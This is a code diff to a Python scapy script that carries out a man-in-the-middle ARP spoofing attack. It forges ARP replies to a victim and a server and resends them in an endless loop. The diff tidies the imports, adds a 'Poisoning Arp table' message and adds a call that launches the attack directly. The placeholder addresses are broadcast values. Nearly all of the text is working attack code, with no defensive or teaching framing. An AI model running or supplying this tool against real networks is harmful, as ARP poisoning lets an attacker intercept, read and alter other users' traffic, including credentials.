@@ -1,4 +1,4 @@
-from scapy.all import *
+from scapy.all import ARP, Ether, conf, getmacbyip, get_if_hwaddr, get_if_addr, sendp
 
 import time
 
@@ -13,8 +13,6 @@ ipVictim = "255.255.255.255"
 
 macServer = "ff:ff:ff:ff:ff:ff"
 ipServer = "255.255.255.255"
-
-
 
 def MIMspoofARP(ipVictim, ipServer):
     macVictim = getmacbyip(ipVictim)
@@ -35,6 +33,9 @@ def MIMspoofARP(ipVictim, ipServer):
     arpFrom[ARP].pdst = ipServer
 
     while(True):
-        sendp(ARPmsg[0], iface=interface)
-        sendp(ARPmsg[1], iface=interface)
+        print("Poisoning Arp table")
+        sendp(arpTo, iface=interface)
+        sendp(arpFrom, iface=interface)
         time.sleep(3600)
+
+MIMspoofARP(ipVictim, ipServer)
